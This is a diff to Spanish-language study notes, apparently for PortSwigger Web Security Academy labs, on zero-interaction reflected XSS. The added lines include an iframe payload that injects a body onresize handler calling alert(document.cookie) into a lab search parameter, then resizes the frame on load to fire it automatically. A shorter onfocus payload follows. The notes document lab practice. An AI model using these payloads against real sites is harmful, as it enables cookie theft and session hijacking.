@@ -139,11 +139,24 @@ El objetivo es lograr la ejecución sin interacción consciente del usuario ("Ze
 
 Técnica para obligar al navegador a ejecutar el evento `onresize` automáticamente.
 
+**Payload Avanzado (Auto-Resize):**
+
 ```html
-<iframe src="url" onload='this.src + "<script>..."'>
+<script>
+    function forceResize() {
+        const frame = document.getElementById('target');
+        frame.style.width = '800px';
+    }
+</script>
+
+<iframe id="target" 
+        src='https://0a610071042e4d2b83fefaa200aa0080.web-security-academy.net/?search="><body onresize=alert(document.cookie)>' 
+        style="width:100px;" 
+        onload="forceResize()">
+</iframe>
 ```
 
-**Payload Avanzado (Auto-Resize):**
+onFocus:
 
 ```html
 <p id="conelid" tabindex="true" onfocus="alert(1)">Texto Invisible</p>
